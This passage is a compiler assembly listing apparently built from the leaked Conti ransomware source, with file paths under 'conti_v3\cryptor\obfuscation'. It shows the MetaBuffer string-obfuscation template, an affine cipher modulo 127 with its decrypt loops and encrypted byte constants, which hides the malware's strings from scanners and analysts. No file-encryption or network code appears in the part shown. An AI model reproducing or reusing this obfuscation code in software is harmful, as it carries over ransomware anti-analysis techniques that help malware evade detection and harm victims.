  0003b	c6 41 0f 5a	 mov	 BYTE PTR [rcx+15], 90	; 0000005aH
  0003f	c6 41 10 09	 mov	 BYTE PTR [rcx+16], 9
  00043	c6 41 11 11	 mov	 BYTE PTR [rcx+17], 17
  00047	c6 41 12 09	 mov	 BYTE PTR [rcx+18], 9
  0004b	c6 41 13 09	 mov	 BYTE PTR [rcx+19], 9
  0004f	c6 41 14 09	 mov	 BYTE PTR [rcx+20], 9
  00053	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00057	48 8b c1	 mov	 rax, rcx
  0005a	c3		 ret	 0
??0?$MetaBuffer@$0DL@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<59,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::MetaBuffer<59,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BN@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<29,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 18 00 00
	00		 mov	 r10d, 24
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 54 00 00 00	 mov	 eax, 84			; 00000054H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 23	 imul	 ecx, eax, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<29,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BN@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BN@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<29,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::MetaBuffer<29,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 15	 mov	 BYTE PTR [rcx+1], 21
  00007	c6 41 02 54	 mov	 BYTE PTR [rcx+2], 84	; 00000054H
  0000b	c6 41 03 3f	 mov	 BYTE PTR [rcx+3], 63	; 0000003fH
  0000f	c6 41 04 54	 mov	 BYTE PTR [rcx+4], 84	; 00000054H
  00013	c6 41 05 67	 mov	 BYTE PTR [rcx+5], 103	; 00000067H
  00017	c6 41 06 54	 mov	 BYTE PTR [rcx+6], 84	; 00000054H
  0001b	c6 41 07 3f	 mov	 BYTE PTR [rcx+7], 63	; 0000003fH
  0001f	c6 41 08 54	 mov	 BYTE PTR [rcx+8], 84	; 00000054H
  00023	c6 41 09 51	 mov	 BYTE PTR [rcx+9], 81	; 00000051H
  00027	c6 41 0a 54	 mov	 BYTE PTR [rcx+10], 84	; 00000054H
  0002b	c6 41 0b 67	 mov	 BYTE PTR [rcx+11], 103	; 00000067H
  0002f	c6 41 0c 54	 mov	 BYTE PTR [rcx+12], 84	; 00000054H
  00033	c6 41 0d 17	 mov	 BYTE PTR [rcx+13], 23
  00037	c6 41 0e 54	 mov	 BYTE PTR [rcx+14], 84	; 00000054H
  0003b	c6 41 0f 58	 mov	 BYTE PTR [rcx+15], 88	; 00000058H
  0003f	c6 41 10 54	 mov	 BYTE PTR [rcx+16], 84	; 00000054H
  00043	c6 41 11 67	 mov	 BYTE PTR [rcx+17], 103	; 00000067H
  00047	c6 41 12 54	 mov	 BYTE PTR [rcx+18], 84	; 00000054H
  0004b	c6 41 13 46	 mov	 BYTE PTR [rcx+19], 70	; 00000046H
  0004f	c6 41 14 54	 mov	 BYTE PTR [rcx+20], 84	; 00000054H
  00053	c6 41 15 75	 mov	 BYTE PTR [rcx+21], 117	; 00000075H
  00057	c6 41 16 54	 mov	 BYTE PTR [rcx+22], 84	; 00000054H
  0005b	c6 41 17 54	 mov	 BYTE PTR [rcx+23], 84	; 00000054H
  0005f	c6 41 18 54	 mov	 BYTE PTR [rcx+24], 84	; 00000054H
  00063	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00067	48 8b c1	 mov	 rax, rcx
  0006a	c3		 ret	 0
??0?$MetaBuffer@$0BN@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<29,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::MetaBuffer<29,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$01$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<2,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 13 00 00 00	 mov	 eax, 19
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 3f	 imul	 ecx, eax, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<2,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$01$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$01$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<2,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<2,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 6f	 mov	 BYTE PTR [rcx+1], 111	; 0000006fH
  00007	c6 41 02 13	 mov	 BYTE PTR [rcx+2], 19
  0000b	c6 41 03 5c	 mov	 BYTE PTR [rcx+3], 92	; 0000005cH
  0000f	c6 41 04 13	 mov	 BYTE PTR [rcx+4], 19
  00013	c6 41 05 56	 mov	 BYTE PTR [rcx+5], 86	; 00000056H
  00017	c6 41 06 13	 mov	 BYTE PTR [rcx+6], 19
  0001b	c6 41 07 5c	 mov	 BYTE PTR [rcx+7], 92	; 0000005cH
  0001f	c6 41 08 13	 mov	 BYTE PTR [rcx+8], 19
  00023	c6 41 09 13	 mov	 BYTE PTR [rcx+9], 19
  00027	c6 41 0a 13	 mov	 BYTE PTR [rcx+10], 19
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$01$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<2,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<2,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CL@$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CL@$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<43,24,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 10 00 00
	00		 mov	 r10d, 16
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 18 00 00 00	 mov	 eax, 24
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 3e	 imul	 ecx, eax, 62		; 0000003eH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CL@$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<43,24,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CL@$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CL@$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<43,24,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::MetaBuffer<43,24,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 61	 mov	 BYTE PTR [rcx+1], 97	; 00000061H
  00007	c6 41 02 18	 mov	 BYTE PTR [rcx+2], 24
  0000b	c6 41 03 06	 mov	 BYTE PTR [rcx+3], 6
  0000f	c6 41 04 18	 mov	 BYTE PTR [rcx+4], 24
  00013	c6 41 05 04	 mov	 BYTE PTR [rcx+5], 4
  00017	c6 41 06 18	 mov	 BYTE PTR [rcx+6], 24
  0001b	c6 41 07 5a	 mov	 BYTE PTR [rcx+7], 90	; 0000005aH
  0001f	c6 41 08 18	 mov	 BYTE PTR [rcx+8], 24
  00023	c6 41 09 0e	 mov	 BYTE PTR [rcx+9], 14
  00027	c6 41 0a 18	 mov	 BYTE PTR [rcx+10], 24
  0002b	c6 41 0b 04	 mov	 BYTE PTR [rcx+11], 4
  0002f	c6 41 0c 18	 mov	 BYTE PTR [rcx+12], 24
  00033	c6 41 0d 5a	 mov	 BYTE PTR [rcx+13], 90	; 0000005aH
  00037	c6 41 0e 18	 mov	 BYTE PTR [rcx+14], 24
  0003b	c6 41 0f 18	 mov	 BYTE PTR [rcx+15], 24
  0003f	c6 41 10 18	 mov	 BYTE PTR [rcx+16], 24
  00043	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00047	48 8b c1	 mov	 rax, rcx
  0004a	c3		 ret	 0
??0?$MetaBuffer@$0CL@$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<43,24,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::MetaBuffer<43,24,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<97,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 39	 sub	 ecx, 57			; 00000039H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 37	 imul	 r8d, ecx, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<97,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<97,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<97,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 4a	 mov	 BYTE PTR [rcx+1], 74	; 0000004aH
  00007	c6 41 02 39	 mov	 BYTE PTR [rcx+2], 57	; 00000039H
  0000b	c6 41 03 08	 mov	 BYTE PTR [rcx+3], 8
  0000f	c6 41 04 39	 mov	 BYTE PTR [rcx+4], 57	; 00000039H
  00013	c6 41 05 7e	 mov	 BYTE PTR [rcx+5], 126	; 0000007eH
  00017	c6 41 06 39	 mov	 BYTE PTR [rcx+6], 57	; 00000039H
  0001b	c6 41 07 69	 mov	 BYTE PTR [rcx+7], 105	; 00000069H
  0001f	c6 41 08 39	 mov	 BYTE PTR [rcx+8], 57	; 00000039H
  00023	c6 41 09 39	 mov	 BYTE PTR [rcx+9], 57	; 00000039H
  00027	c6 41 0a 39	 mov	 BYTE PTR [rcx+10], 57	; 00000039H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<97,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<97,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
